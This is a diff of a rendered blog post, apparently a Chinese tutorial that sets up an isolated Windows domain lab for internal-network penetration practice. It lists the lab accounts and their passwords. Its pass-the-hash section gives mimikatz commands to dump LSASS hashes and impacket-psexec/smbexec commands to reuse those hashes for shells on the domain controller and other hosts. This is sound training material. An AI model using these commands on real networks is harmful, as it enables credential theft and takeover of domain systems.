@@ -9,10 +9,90 @@
   <title>内网渗透域情况 | ZQ-Rookie-Hacker&#39;s Blog</title>
   <meta name="author" content="ZQ-Rookie-Hacker">
   
-  <meta name="description" content="### 一、环境拓扑概览
-- **域名**：`HACKING`（NetBIOS 名称），DNS 域名为 `hacking.com`
-- **域控制器**：`DC_2012_R2`（Windows Server 2012 R2，IP：192.168.64.10）
-- **成员服务器**：`winser">
+  <meta name="description" content="一、环境拓扑概览
+域名：HACKING（NetBIOS 名称），DNS 域名为 hacking.com
+域控制器：DC_2012_R2（Windows Server 2012 R2，IP：192.168.64.10）
+成员服务器：winserv12R2（已加入域，IP：192.168.64.20）
+加入域的 Windows 10 主机：win10（已加入域，IP：192.168.64.30）
+攻击机：Kali-2025（IP：192.168.64.100，模拟外部攻击者，为实验方便置于同一网络）
+网络模式：仅主机（Host-Only），所有虚拟机处于同一隔离网络（192.168.64.0&amp;#x2F;24）
+
+
+二、Mermaid 域关系图
+
+三、核心表格：账号密码及登录关系
+
+
+账号标识
+密码
+账号类型
+登录格式示例
+认证位置
+可登录主机
+
+
+
+域管理员 Administrator
+默认密码
+域账号
+HACKING\Administrator 或 administrator@hacking.com
+域控制器
+域内所有计算机（DC&amp;#x2F;成员服务器&amp;#x2F;Win10）
+
+
+域用户 user1
+qwER1234.
+域账号
+HACKING\user1 或 user1@hacking.com
+域控制器
+域内所有计算机
+
+
+域用户 test
+qwER1234.
+域账号
+HACKING\test 或 test@hacking.com
+域控制器
+域内所有计算机
+
+
+DC本地管理员
+默认密码
+本地账号
+.\Administrator 或 DC_2012_R2\Administrator
+DC本地SAM
+仅域控制器 DC_2012_R2
+
+
+成员服务器本地管理员
+默认密码
+本地账号
+.\Administrator 或 winserv12R2\Administrator
+成员服务器本地SAM
+仅成员服务器 winserv12R2
+
+
+成员服务器本地用户 kdy1
+qwER1234.
+本地账号
+.\kdy1 或 winserv12R2\kdy1
+成员服务器本地SAM
+仅成员服务器 winserv12R2
+
+
+Win10本地管理员
+默认密码
+本地账号
+.\Administrator 或 win10\Administrator
+Win10本地SAM
+仅 Win10 主机
+
+
+
+登录格式说明：
+
+域登录：HACKING\用户名 或 用户名@hacking.com
+本地登录：.\用户名 或 计算机名\用户名"> 
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -36,6 +116,7 @@
   <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/mobile-optimized.css" media="screen" type="text/css">
   <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 
   <script src="/js/jquery-2.0.3.min.js"></script>
@@ -57,7 +138,26 @@
 
 
 
-<meta name="generator" content="Hexo 8.1.1"></head>
+<meta name="generator" content="Hexo 8.1.1"><script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']],
+    displayMath: [['$$', '$$'], ['\\[', '\\]']],
+    processEscapes: true,
+    processEnvironments: true
+  },
+  options: {
+    skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+  },
+  startup: {
+    pageReady: () => {
+      return MathJax.startup.defaultPageReady();
+    }
+  }
+};
+</script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</head>
 
  <body>  
   <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
@@ -126,136 +226,252 @@
 		  
 		  
 
-		  <pre><code>### 一、环境拓扑概览
-- **域名**：`HACKING`（NetBIOS 名称），DNS 域名为 `hacking.com`
-- **域控制器**：`DC_2012_R2`（Windows Server 2012 R2，IP：192.168.64.10）
-- **成员服务器**：`winserv12R2`（已加入域，IP：192.168.64.20）
-- **加入域的 Windows 10 主机**：`win10`（已加入域，IP：192.168.64.30）
-- **攻击机**：`Kali-2025`（IP：192.168.64.100，模拟外部攻击者，为实验方便置于同一网络）
-- **网络模式**：仅主机（Host-Only），所有虚拟机处于同一隔离网络（192.168.64.0/24）
-
----
-
-### 二、Mermaid 域关系图
-</code></pre>
-<p>  <img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%9F%E6%83%85%E5%86%B5/image_1.png" alt="在这里插入图片描述"></p>
-<pre><code>---
-
-### 三、核心表格：账号密码及登录关系
-
-| 账号标识                    | 密码        | 账号类型 | 登录格式示例                                           | 认证位置          | 可登录主机                            |
-| --------------------------- | ----------- | -------- | ------------------------------------------------------ | ----------------- | ------------------------------------- |
-| **域管理员 Administrator**  | 默认密码    | 域账号   | `HACKING\Administrator` 或 `administrator@hacking.com` | 域控制器          | 域内所有计算机（DC/成员服务器/Win10） |
-| **域用户 user1**            | `qwER1234.` | 域账号   | `HACKING\user1` 或 `user1@hacking.com`                 | 域控制器          | 域内所有计算机                        |
-| **域用户 test**             | `qwER1234.` | 域账号   | `HACKING\test` 或 `test@hacking.com`                   | 域控制器          | 域内所有计算机                        |
-| **DC本地管理员**            | 默认密码    | 本地账号 | `.\Administrator` 或 `DC_2012_R2\Administrator`        | DC本地SAM         | 仅域控制器 `DC_2012_R2`               |
-| **成员服务器本地管理员**    | 默认密码    | 本地账号 | `.\Administrator` 或 `winserv12R2\Administrator`       | 成员服务器本地SAM | 仅成员服务器 `winserv12R2`            |
-| **成员服务器本地用户 kdy1** | `qwER1234.` | 本地账号 | `.\kdy1` 或 `winserv12R2\kdy1`                         | 成员服务器本地SAM | 仅成员服务器 `winserv12R2`            |
-| **Win10本地管理员**         | 默认密码    | 本地账号 | `.\Administrator` 或 `win10\Administrator`             | Win10本地SAM      | 仅 Win10 主机                         |
-
-&gt; **登录格式说明**：
-&gt; - 域登录：`HACKING\用户名` 或 `用户名@hacking.com`
-&gt; - 本地登录：`.\用户名` 或 `计算机名\用户名`
-
----
-
-### 四、域登录机制
-1. **非域控制器上登录域用户**：
-   - 本机向域控制器发送验证请求：验证用户提供的域账号和密码。
-   - 域控制器核对 Active Directory 中的账号信息后返回结果。
-   - 验证通过后，允许用户登录本机，并在本机创建用户配置文件（`C:\Users\用户名`）。
-2. **域用户的权限**：
-   - 域用户在特定计算机上的权限取决于该域账号被加入的本地组（如 Administrators、Remote Desktop Users 等），或通过域组策略分配。
-3. **加入域的过程**：
-   - 使用域管理员账号（如 `HACKING\Administrator`）临时授权，将计算机添加到域。
-   - 此管理员账号不会与计算机绑定，之后任何域账号均可登录（除非受限）。
-4. **域账号的通用性**：
-   - 一旦计算机加入域，所有域账号理论上都可以登录该计算机（除非被组策略或本地策略明确拒绝）。
-
----
-
-### 五、常用命令解析
-
-| 命令                               | 作用                                                     |
-| ---------------------------------- | -------------------------------------------------------- |
-| `net accounts /maxpwage:unlimited` | 设置域账户密码永不过期（常用于服务账号）                 |
-| `net config workstation`           | 显示当前计算机的工作站配置，验证加域状态                 |
-| `net view /domain:HACKING`         | 列出域 `HACKING` 中的所有计算机（注意 `HACKING` 需大写） |
-| `net user`                         | 列出本地计算机上的所有本地用户账户                       |
-| `whoami`                           | 显示当前登录的用户名及所在域/计算机                      |
-| `nslookup hacking.com`             | 测试 DNS 解析，应返回域控 IP `192.168.64.10`             |
-
----
-
-### 六、当前状态验证（预期）
-- **网络连通性**：所有主机在同一 Host-Only 网络，可互相 ping 通（需关闭 Windows 防火墙或放行 ICMP，尤其是 win10）。
-- **DNS解析**：在成员服务器和 win10 上执行 `nslookup hacking.com` 应返回 `192.168.64.10`。
-- **域控可见性**：`net view /domain:HACKING` 应列出域内所有计算机（DC、winserv12R2、win10）。若 win10 执行该命令出现“系统错误 1231”，请在 win10 中启用 SMB 1.0（控制面板 → 程序 → 启动或关闭 Windows 功能 → 勾选“SMB 1.0/CIFS 文件共享支持”）。
-- **域用户登录测试**：
-  - `HACKING\user1` 可登录成员服务器 `winserv12R2` 和 win10。
-  - `HACKING\test` 可登录 win10 和成员服务器。
-- **本地用户登录测试**：
-  - `.\kdy1` 可登录成员服务器 `winserv12R2`。
-  - `.\Administrator` 可登录各自主机本地。
-
----
-
-### 七、渗透测试攻击路径示意
-1. **信息收集**：Kali 扫描内网主机（`nmap -sV 192.168.64.0/24`），识别开放端口和服务。
-2. **初始入侵**：针对成员服务器 `winserv12R2`（可能运行 Web 服务）或 win10 的漏洞进行利用，获取初始权限。
-3. **权限提升**：在受控主机上进行本地提权，获取 SYSTEM 或本地管理员权限。
-4. **横向移动**：
-   - 从受控主机收集域信息（域用户、组策略、信任关系等）。
-   - 抓取主机内的凭据（如 LSASS 进程中的 NTLM Hash/明文密码）。
-   - 利用 **PTH（Pass The Hash）哈希传递** 攻击域控 `192.168.64.10` 或其他域内主机。
-5. **域控权限获取**：成功控制域控后，获取整个域的管理权限。
-
----
-
-### 八、Windows认证机制与PTH哈希传递（横向渗透核心）
-
-#### 8.1 Windows认证体系核心组件
-| 组件                               | 位置               | 功能                                                         |
-| ---------------------------------- | ------------------ | ------------------------------------------------------------ |
-| **LSASS.exe**                      | 每台Windows主机    | 负责本地安全策略、用户认证、生成访问令牌，是认证的中心进程。 |
-| **Netlogon 服务**                  | 每台Windows主机    | 处理域认证通道，与域控的Netlogon服务通信，建立安全通道。     |
-| **NTLM SSP**                       | LSASS内部          | 实现NTLM质询/响应协议，支持向下兼容认证。                    |
-| **Kerberos SSP**                   | LSASS内部          | 实现Kerberos V5认证协议，域内默认认证方式。                  |
-| **SAM**（注册表）                  | `HKLM\SAM`         | 存储本地用户凭证的NTLM哈希。                                 |
-| **Active Directory**               | 域控制器           | 存储所有域用户/计算机的凭证哈希、Kerberos密钥等信息。        |
-| **KDC**（Key Distribution Center） | 域控制器           | Kerberos认证中心，包含AS和TGS服务。                          |
-| **NTDS.dit**                       | 域控制器数据库文件 | Active Directory的物理存储文件，包含所有对象及哈希。         |
-
-#### 8.2 域登录认证详解：Kerberos 主流程与 NTLM 回退机制
-</code></pre>
-<p>  <img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%9F%E6%83%85%E5%86%B5/image_2.png" alt="在这里插入图片描述"></p>
+		  <h3 id="一、环境拓扑概览"><a href="#一、环境拓扑概览" class="headerlink" title="一、环境拓扑概览"></a>一、环境拓扑概览</h3><ul>
+<li><strong>域名</strong>：<code>HACKING</code>（NetBIOS 名称），DNS 域名为 <code>hacking.com</code></li>
+<li><strong>域控制器</strong>：<code>DC_2012_R2</code>（Windows Server 2012 R2，IP：192.168.64.10）</li>
+<li><strong>成员服务器</strong>：<code>winserv12R2</code>（已加入域，IP：192.168.64.20）</li>
+<li><strong>加入域的 Windows 10 主机</strong>：<code>win10</code>（已加入域，IP：192.168.64.30）</li>
+<li><strong>攻击机</strong>：<code>Kali-2025</code>（IP：192.168.64.100，模拟外部攻击者，为实验方便置于同一网络）</li>
+<li><strong>网络模式</strong>：仅主机（Host-Only），所有虚拟机处于同一隔离网络（192.168.64.0&#x2F;24）</li>
+</ul>
+<hr>
+<h3 id="二、Mermaid-域关系图"><a href="#二、Mermaid-域关系图" class="headerlink" title="二、Mermaid 域关系图"></a>二、Mermaid 域关系图</h3><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%9F%E6%83%85%E5%86%B5/image_1.png" alt="在这里插入图片描述"></p>
+<hr>
+<h3 id="三、核心表格：账号密码及登录关系"><a href="#三、核心表格：账号密码及登录关系" class="headerlink" title="三、核心表格：账号密码及登录关系"></a>三、核心表格：账号密码及登录关系</h3><table>
+<thead>
+<tr>
+<th>账号标识</th>
+<th>密码</th>
+<th>账号类型</th>
+<th>登录格式示例</th>
+<th>认证位置</th>
+<th>可登录主机</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>域管理员 Administrator</strong></td>
+<td>默认密码</td>
+<td>域账号</td>
+<td><code>HACKING\Administrator</code> 或 <code>administrator@hacking.com</code></td>
+<td>域控制器</td>
+<td>域内所有计算机（DC&#x2F;成员服务器&#x2F;Win10）</td>
+</tr>
+<tr>
+<td><strong>域用户 user1</strong></td>
+<td><code>qwER1234.</code></td>
+<td>域账号</td>
+<td><code>HACKING\user1</code> 或 <code>user1@hacking.com</code></td>
+<td>域控制器</td>
+<td>域内所有计算机</td>
+</tr>
+<tr>
+<td><strong>域用户 test</strong></td>
+<td><code>qwER1234.</code></td>
+<td>域账号</td>
+<td><code>HACKING\test</code> 或 <code>test@hacking.com</code></td>
+<td>域控制器</td>
+<td>域内所有计算机</td>
+</tr>
+<tr>
+<td><strong>DC本地管理员</strong></td>
+<td>默认密码</td>
+<td>本地账号</td>
+<td><code>.\Administrator</code> 或 <code>DC_2012_R2\Administrator</code></td>
+<td>DC本地SAM</td>
+<td>仅域控制器 <code>DC_2012_R2</code></td>
+</tr>
+<tr>
+<td><strong>成员服务器本地管理员</strong></td>
+<td>默认密码</td>
+<td>本地账号</td>
+<td><code>.\Administrator</code> 或 <code>winserv12R2\Administrator</code></td>
+<td>成员服务器本地SAM</td>
+<td>仅成员服务器 <code>winserv12R2</code></td>
+</tr>
+<tr>
+<td><strong>成员服务器本地用户 kdy1</strong></td>
+<td><code>qwER1234.</code></td>
+<td>本地账号</td>
+<td><code>.\kdy1</code> 或 <code>winserv12R2\kdy1</code></td>
+<td>成员服务器本地SAM</td>
+<td>仅成员服务器 <code>winserv12R2</code></td>
+</tr>
+<tr>
+<td><strong>Win10本地管理员</strong></td>
+<td>默认密码</td>
+<td>本地账号</td>
+<td><code>.\Administrator</code> 或 <code>win10\Administrator</code></td>
+<td>Win10本地SAM</td>
+<td>仅 Win10 主机</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>登录格式说明</strong>：</p>
+<ul>
+<li>域登录：<code>HACKING\用户名</code> 或 <code>用户名@hacking.com</code></li>
+<li>本地登录：<code>.\用户名</code> 或 <code>计算机名\用户名</code></li>
+</ul>
+</blockquote>
+<hr>
+<h3 id="四、域登录机制"><a href="#四、域登录机制" class="headerlink" title="四、域登录机制"></a>四、域登录机制</h3><ol>
+<li><strong>非域控制器上登录域用户</strong>：<ul>
+<li>本机向域控制器发送验证请求：验证用户提供的域账号和密码。</li>
+<li>域控制器核对 Active Directory 中的账号信息后返回结果。</li>
+<li>验证通过后，允许用户登录本机，并在本机创建用户配置文件（<code>C:\Users\用户名</code>）。</li>
+</ul>
+</li>
+<li><strong>域用户的权限</strong>：<ul>
+<li>域用户在特定计算机上的权限取决于该域账号被加入的本地组（如 Administrators、Remote Desktop Users 等），或通过域组策略分配。</li>
+</ul>
+</li>
+<li><strong>加入域的过程</strong>：<ul>
+<li>使用域管理员账号（如 <code>HACKING\Administrator</code>）临时授权，将计算机添加到域。</li>
+<li>此管理员账号不会与计算机绑定，之后任何域账号均可登录（除非受限）。</li>
+</ul>
+</li>
+<li><strong>域账号的通用性</strong>：<ul>
+<li>一旦计算机加入域，所有域账号理论上都可以登录该计算机（除非被组策略或本地策略明确拒绝）。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="五、常用命令解析"><a href="#五、常用命令解析" class="headerlink" title="五、常用命令解析"></a>五、常用命令解析</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>net accounts /maxpwage:unlimited</code></td>
+<td>设置域账户密码永不过期（常用于服务账号）</td>
+</tr>
+<tr>
+<td><code>net config workstation</code></td>
+<td>显示当前计算机的工作站配置，验证加域状态</td>
+</tr>
+<tr>
+<td><code>net view /domain:HACKING</code></td>
+<td>列出域 <code>HACKING</code> 中的所有计算机（注意 <code>HACKING</code> 需大写）</td>
+</tr>
+<tr>
+<td><code>net user</code></td>
+<td>列出本地计算机上的所有本地用户账户</td>
+</tr>
+<tr>
+<td><code>whoami</code></td>
+<td>显示当前登录的用户名及所在域&#x2F;计算机</td>
+</tr>
+<tr>
+<td><code>nslookup hacking.com</code></td>
+<td>测试 DNS 解析，应返回域控 IP <code>192.168.64.10</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="六、当前状态验证（预期）"><a href="#六、当前状态验证（预期）" class="headerlink" title="六、当前状态验证（预期）"></a>六、当前状态验证（预期）</h3><ul>
+<li><strong>网络连通性</strong>：所有主机在同一 Host-Only 网络，可互相 ping 通（需关闭 Windows 防火墙或放行 ICMP，尤其是 win10）。</li>
+<li><strong>DNS解析</strong>：在成员服务器和 win10 上执行 <code>nslookup hacking.com</code> 应返回 <code>192.168.64.10</code>。</li>
+<li><strong>域控可见性</strong>：<code>net view /domain:HACKING</code> 应列出域内所有计算机（DC、winserv12R2、win10）。若 win10 执行该命令出现”系统错误 1231”，请在 win10 中启用 SMB 1.0（控制面板 → 程序 → 启动或关闭 Windows 功能 → 勾选”SMB 1.0&#x2F;CIFS 文件共享支持”）。</li>
+<li><strong>域用户登录测试</strong>：<ul>
+<li><code>HACKING\user1</code> 可登录成员服务器 <code>winserv12R2</code> 和 win10。</li>
+<li><code>HACKING\test</code> 可登录 win10 和成员服务器。</li>
+</ul>
+</li>
+<li><strong>本地用户登录测试</strong>：<ul>
+<li><code>.\kdy1</code> 可登录成员服务器 <code>winserv12R2</code>。</li>
+<li><code>.\Administrator</code> 可登录各自主机本地。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="七、渗透测试攻击路径示意"><a href="#七、渗透测试攻击路径示意" class="headerlink" title="七、渗透测试攻击路径示意"></a>七、渗透测试攻击路径示意</h3><ol>
+<li><strong>信息收集</strong>：Kali 扫描内网主机（<code>nmap -sV 192.168.64.0/24</code>），识别开放端口和服务。</li>
+<li><strong>初始入侵</strong>：针对成员服务器 <code>winserv12R2</code>（可能运行 Web 服务）或 win10 的漏洞进行利用，获取初始权限。</li>
+<li><strong>权限提升</strong>：在受控主机上进行本地提权，获取 SYSTEM 或本地管理员权限。</li>
+<li><strong>横向移动</strong>：<ul>
+<li>从受控主机收集域信息（域用户、组策略、信任关系等）。</li>
+<li>抓取主机内的凭据（如 LSASS 进程中的 NTLM Hash&#x2F;明文密码）。</li>
+<li>利用 <strong>PTH（Pass The Hash）哈希传递</strong> 攻击域控 <code>192.168.64.10</code> 或其他域内主机。</li>
+</ul>
+</li>
+<li><strong>域控权限获取</strong>：成功控制域控后，获取整个域的管理权限。</li>
+</ol>
+<hr>
+<h3 id="八、Windows认证机制与PTH哈希传递（横向渗透核心）"><a href="#八、Windows认证机制与PTH哈希传递（横向渗透核心）" class="headerlink" title="八、Windows认证机制与PTH哈希传递（横向渗透核心）"></a>八、Windows认证机制与PTH哈希传递（横向渗透核心）</h3><h4 id="8-1-Windows认证体系核心组件"><a href="#8-1-Windows认证体系核心组件" class="headerlink" title="8.1 Windows认证体系核心组件"></a>8.1 Windows认证体系核心组件</h4><table>
+<thead>
+<tr>
+<th>组件</th>
+<th>位置</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>LSASS.exe</strong></td>
+<td>每台Windows主机</td>
+<td>负责本地安全策略、用户认证、生成访问令牌，是认证的中心进程。</td>
+</tr>
+<tr>
+<td><strong>Netlogon 服务</strong></td>
+<td>每台Windows主机</td>
+<td>处理域认证通道，与域控的Netlogon服务通信，建立安全通道。</td>
+</tr>
+<tr>
+<td><strong>NTLM SSP</strong></td>
+<td>LSASS内部</td>
+<td>实现NTLM质询&#x2F;响应协议，支持向下兼容认证。</td>
+</tr>
+<tr>
+<td><strong>Kerberos SSP</strong></td>
+<td>LSASS内部</td>
+<td>实现Kerberos V5认证协议，域内默认认证方式。</td>
+</tr>
+<tr>
+<td><strong>SAM</strong>（注册表）</td>
+<td><code>HKLM\SAM</code></td>
+<td>存储本地用户凭证的NTLM哈希。</td>
+</tr>
+<tr>
+<td><strong>Active Directory</strong></td>
+<td>域控制器</td>
+<td>存储所有域用户&#x2F;计算机的凭证哈希、Kerberos密钥等信息。</td>
+</tr>
+<tr>
+<td><strong>KDC</strong>（Key Distribution Center）</td>
+<td>域控制器</td>
+<td>Kerberos认证中心，包含AS和TGS服务。</td>
+</tr>
+<tr>
+<td><strong>NTDS.dit</strong></td>
+<td>域控制器数据库文件</td>
+<td>Active Directory的物理存储文件，包含所有对象及哈希。</td>
+</tr>
+</tbody></table>
+<h4 id="8-2-域登录认证详解：Kerberos-主流程与-NTLM-回退机制"><a href="#8-2-域登录认证详解：Kerberos-主流程与-NTLM-回退机制" class="headerlink" title="8.2 域登录认证详解：Kerberos 主流程与 NTLM 回退机制"></a>8.2 域登录认证详解：Kerberos 主流程与 NTLM 回退机制</h4><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%9F%E6%83%85%E5%86%B5/image_2.png" alt="在这里插入图片描述"></p>
 <p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%9F%E6%83%85%E5%86%B5/image_3.png" alt="在这里插入图片描述"></p>
-<pre><code>#### 8.4 PTH攻击实操示例（针对当前环境）
-假设已通过Web漏洞获得`winserv12R2`的SYSTEM权限：
-
-1. **在winserv12R2上运行mimikatz抓取域用户`user1`的哈希**：
-   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-   输出中包含`user1`的NTLM哈希，例如`8846f7eaee8fb117ad06bdd830b7586c`。
-
-2. **在Kali上使用impacket-psexec直接登录域控**：
-   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c HACKING/user1@192.168.64.10</span><br></pre></td></tr></table></figure>
-   成功获得域控的cmd shell。
-
-3. **使用相同哈希登录Win10**：
-   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbexec -hashes :8846f7eaee8fb117ad06bdd830b7586c HACKING/user1@192.168.64.30</span><br></pre></td></tr></table></figure>
-   实现横向移动。
-
----
-
-### 九、注意事项
-- **防火墙**：所有主机需关闭 Windows 防火墙或放行必要端口（ICMP、SMB 445/139、RDP 3389 等），以便测试连通性和 PTH 攻击。
-- **实验隔离**：环境仅限 Host-Only 网络，确保与外部网络隔离，防止意外泄露或攻击外部系统。
-- **密码安全**：默认密码仅为实验方便，实际生产环境应立即修改并启用强密码策略。
-- **PTH 适用性**：PTH 攻击基于 NTLM 协议，若目标强制使用 Kerberos 且未配置约束委派，可能受限。可配合其他攻击手法（如黄金票据、PTK）。
-- **LSASS 保护**：现代 Windows 可启用 LSA 保护（RunAsPPL）防止凭据提取，实验环境中可暂时关闭以便测试。
-
----
-</code></pre>
+<h4 id="8-4-PTH攻击实操示例（针对当前环境）"><a href="#8-4-PTH攻击实操示例（针对当前环境）" class="headerlink" title="8.4 PTH攻击实操示例（针对当前环境）"></a>8.4 PTH攻击实操示例（针对当前环境）</h4><p>假设已通过Web漏洞获得<code>winserv12R2</code>的SYSTEM权限：</p>
+<ol>
+<li><p><strong>在winserv12R2上运行mimikatz抓取域用户<code>user1</code>的哈希</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<p>输出中包含<code>user1</code>的NTLM哈希，例如<code>8846f7eaee8fb117ad06bdd830b7586c</code>。</p>
+</li>
+<li><p><strong>在Kali上使用impacket-psexec直接登录域控</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c HACKING/user1@192.168.64.10</span><br></pre></td></tr></table></figure>
+<p>成功获得域控的cmd shell。</p>
+</li>
+<li><p><strong>使用相同哈希登录Win10</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-smbexec -hashes :8846f7eaee8fb117ad06bdd830b7586c HACKING/user1@192.168.64.30</span><br></pre></td></tr></table></figure>
+<p>实现横向移动。</p>
+</li>
+</ol>
+<hr>
+<h3 id="九、注意事项"><a href="#九、注意事项" class="headerlink" title="九、注意事项"></a>九、注意事项</h3><ul>
+<li><strong>防火墙</strong>：所有主机需关闭 Windows 防火墙或放行必要端口（ICMP、SMB 445&#x2F;139、RDP 3389 等），以便测试连通性和 PTH 攻击。</li>
+<li><strong>实验隔离</strong>：环境仅限 Host-Only 网络，确保与外部网络隔离，防止意外泄露或攻击外部系统。</li>
+<li><strong>密码安全</strong>：默认密码仅为实验方便，实际生产环境应立即修改并启用强密码策略。</li>
+<li><strong>PTH 适用性</strong>：PTH 攻击基于 NTLM 协议，若目标强制使用 Kerberos 且未配置约束委派，可能受限。可配合其他攻击手法（如黄金票据、PTK）。</li>
+<li><strong>LSASS 保护</strong>：现代 Windows 可启用 LSA 保护（RunAsPPL）防止凭据提取，实验环境中可暂时关闭以便测试。</li>
+</ul>
+<hr>
 
 		  <div class="article-footer-copyright">
 
@@ -379,7 +595,7 @@ window.addEventListener('load', function() {
 			<ul id="categorys" class="tag_box list-unstyled collapse in">
 				  
   <li>
-    <li><a href="/categories/网络安全/">网络安全<span>35</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/">SRC&渗透<span>7</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/内网/">内网<span>3</span></a></li>
+    <li><a href="/categories/网络安全/">网络安全<span>44</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/">SRC&渗透<span>11</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/内网/">内网<span>3</span></a></li>
   </li>
 
 			</ul>
@@ -403,7 +619,7 @@ window.addEventListener('load', function() {
 <div class="widget-wrap">
   <h3 class="widget-title" style="font-family: monospace; font-size: 1.3em; font-weight: bold; color: #fff;">Categories</h3>
   <div class="widget category-tree">
-    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/">408</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/">CTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/">python</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">35</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/">SRC&渗透</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/">我的SRC</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%80%9D%E8%B7%AF/">思路</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" 